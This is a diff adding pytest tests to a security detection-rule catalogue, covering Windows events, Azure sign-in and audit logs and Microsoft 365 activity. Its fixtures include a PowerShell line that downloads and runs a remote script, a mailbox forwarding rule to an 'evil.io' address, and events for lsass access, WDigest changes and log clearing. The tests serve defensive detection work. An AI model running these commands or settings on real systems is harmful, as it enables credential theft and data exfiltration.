@@ -188,3 +188,111 @@ def test_every_rule_id_is_unique_and_prefixed() -> None:
 @pytest.mark.parametrize("family", ["WEB", "AUTH", "WIN", "LNX", "AWS", "K8S", "MAIL", "PCAP", "APP", "NET"])
 def test_each_family_is_represented(family: str) -> None:
     assert any(r.id.startswith(f"SIGMA-{family}-") for r in RULES), f"no {family} rules in the catalogue"
+
+
+# --------------------------------------------------------------------- Windows (third tranche)
+def test_credential_access_and_lateral_movement_events() -> None:
+    ev = [_ev(1, "windows.evtx", "explicit creds", {"EventID": "4648", "SubjectUserName": "alice"}),
+          _ev(2, "windows.evtx", "lockout", {"EventID": "4740", "TargetUserName": "bob"}),
+          _ev(3, "windows.evtx", "registry",
+              {"EventID": "4657", "ObjectName": r"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential"}),
+          _ev(4, "windows.evtx", "script block",
+              {"EventID": "4104", "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"}),
+          # a REAL public address: 198.51.100.x and 203.0.113.x are documentation ranges, which
+          # ipaddress (and therefore normalize.is_public_ip) correctly reports as not global
+          _ev(5, "windows.evtx", "rdp", {"EventID": "4624", "LogonType": "10", "IpAddress": "45.33.32.156",
+                                         "TargetUserName": "admin"}),
+          _ev(6, "windows.evtx", "share", {"EventID": "5140", "ShareName": r"\*\ADMIN$"}),
+          _ev(7, "windows.evtx", "handle", {"EventID": "4656", "ObjectName": r"C:\Windows\System32\lsass.exe"}),
+          _ev(8, "windows.evtx", "log cleared", {"EventID": "104", "Channel": "System"}),
+          _ev(9, "windows.evtx", "fw rule", {"EventID": "4946", "RuleName": "allow 4444"})]
+    hits = _run(ev)
+    for rid in ("SIGMA-WIN-0200", "SIGMA-WIN-0205", "SIGMA-WIN-0215", "SIGMA-WIN-0220", "SIGMA-WIN-0225",
+                "SIGMA-WIN-0250", "SIGMA-WIN-0255", "SIGMA-WIN-0235", "SIGMA-WIN-0230"):
+        assert rid in hits, rid
+
+
+# --------------------------------------------------------------------- Azure / Entra ID
+def _azure(i: int, fields: dict) -> Event:
+    return _ev(i, "app.jsonl", "azure sign-in", fields)
+
+
+def test_azure_signin_rules_read_the_fields_the_export_carries() -> None:
+    ev = [_azure(1, {"userPrincipalName": "alice@corp.com", "resultType": "0",
+                     "riskLevelDuringSignIn": "high", "clientAppUsed": "Browser"}),
+          _azure(2, {"userPrincipalName": "bob@corp.com", "resultType": "0", "clientAppUsed": "IMAP4"}),
+          _azure(3, {"userPrincipalName": "bob@corp.com", "resultType": "500121"}),
+          _azure(4, {"userPrincipalName": "carol@corp.com", "resultType": "53003",
+                     "conditionalAccessStatus": "failure"})]
+    hits = _run(ev)
+    for rid in ("SIGMA-AZURE-0010", "SIGMA-AZURE-0014", "SIGMA-AZURE-0018", "SIGMA-AZURE-0022"):
+        assert rid in hits, rid
+
+
+def test_azure_audit_rules_read_operation_names() -> None:
+    ev = [_azure(1, {"operationName": "Consent to application", "initiatedBy.user.userPrincipalName": "alice@corp.com"}),
+          _ev(2, "app.jsonl", "role", {"operationName": "Add member to role"},
+              raw='{"operationName":"Add member to role","targetResources":[{"displayName":"Global Administrator"}]}'),
+          _azure(3, {"operationName": "Add service principal credentials"}),
+          _azure(4, {"operationName": "Delete conditional access policy"})]
+    hits = _run(ev)
+    for rid in ("SIGMA-AZURE-0030", "SIGMA-AZURE-0034", "SIGMA-AZURE-0038", "SIGMA-AZURE-0046"):
+        assert rid in hits, rid
+
+
+def test_azure_signin_failure_burst_and_multiple_countries() -> None:
+    fails = [_azure(i, {"userPrincipalName": "dave@corp.com", "resultType": "50126"}) for i in range(15)]
+    assert _fires("SIGMA-AZURE-0026", fails)
+
+    trips = [_azure(i, {"userPrincipalName": "erin@corp.com", "resultType": "0",
+                        "location.countryOrRegion": "GB" if i % 2 else "RU"})
+             for i in range(6)]
+    hit = _fires("SIGMA-AZURE-0042", trips)
+    assert "different countries" in hit[0].msg
+
+
+# --------------------------------------------------------------------- Microsoft 365 / Defender
+def test_microsoft_365_audit_rules() -> None:
+    ev = [_ev(1, "app.jsonl", "rule", {"Operation": "New-InboxRule", "UserId": "alice@corp.com"}),
+          _ev(2, "app.jsonl", "fwd", {"Operation": "Set-Mailbox", "UserId": "alice@corp.com"},
+              raw='{"Operation":"Set-Mailbox","Parameters":[{"Name":"ForwardingSmtpAddress","Value":"x@evil.io"}]}'),
+          _ev(3, "app.jsonl", "search", {"Operation": "SearchExported", "UserId": "bob@corp.com"}),
+          _ev(4, "app.jsonl", "share", {"Operation": "AnonymousLinkCreated", "UserId": "bob@corp.com"}),
+          _ev(5, "app.jsonl", "audit off", {"Operation": "Set-AdminAuditLogConfig", "UserId": "eve@corp.com"}),
+          _ev(6, "app.jsonl", "alert", {"AlertId": "da123", "Severity": "High", "Title": "Suspicious inbox rule"}),
+          _ev(7, "app.jsonl", "phish", {"ThreatType": "Phish", "DeliveryAction": "Blocked"})]
+    hits = _run(ev)
+    for rid in ("SIGMA-M365-0014", "SIGMA-M365-0018", "SIGMA-M365-0022", "SIGMA-M365-0026",
+                "SIGMA-M365-0038", "SIGMA-M365-0010", "SIGMA-M365-0034"):
+        assert rid in hits, rid
+
+
+def test_bulk_download_burst() -> None:
+    ev = [_ev(i, "app.jsonl", "download", {"Operation": "FileDownloaded", "UserId": "mallory@corp.com"})
+          for i in range(150)]
+    assert _fires("SIGMA-M365-0030", ev)
+
+
+# --------------------------------------------------------------------- one account, many addresses
+def test_an_account_used_from_many_addresses_is_flagged_across_families() -> None:
+    """The analyst asked for this one by name. It reads Windows, syslog, web and cloud sign-ins together
+    because a credential in two pairs of hands rarely shows up in a single log."""
+    ev = ([_ev(i, "windows.evtx", "logon", {"EventID": "4624", "TargetUserName": "alice",
+                                            "IpAddress": f"198.51.100.{i}"}) for i in range(3)]
+          + [_azure(10 + i, {"userPrincipalName": "alice", "resultType": "0",
+                             "callerIpAddress": f"203.0.113.{20 + i}"}) for i in range(3)])
+    hit = _fires("SIGMA-AUTH-0240", ev)
+    assert "different addresses" in hit[0].msg
+
+
+def test_one_account_from_one_address_is_not_flagged() -> None:
+    ev = [_ev(i, "windows.evtx", "logon", {"EventID": "4624", "TargetUserName": "alice",
+                                           "IpAddress": "10.0.0.5"}) for i in range(30)]
+    assert "SIGMA-AUTH-0240" not in _run(ev)
+
+
+def test_machine_accounts_do_not_drive_the_multi_address_rule() -> None:
+    """A computer account authenticates constantly and would dominate every per-account count."""
+    ev = [_ev(i, "windows.evtx", "logon", {"EventID": "4624", "TargetUserName": "WS01$",
+                                           "IpAddress": f"10.0.0.{i}"}) for i in range(20)]
+    assert "SIGMA-AUTH-0240" not in _run(ev)
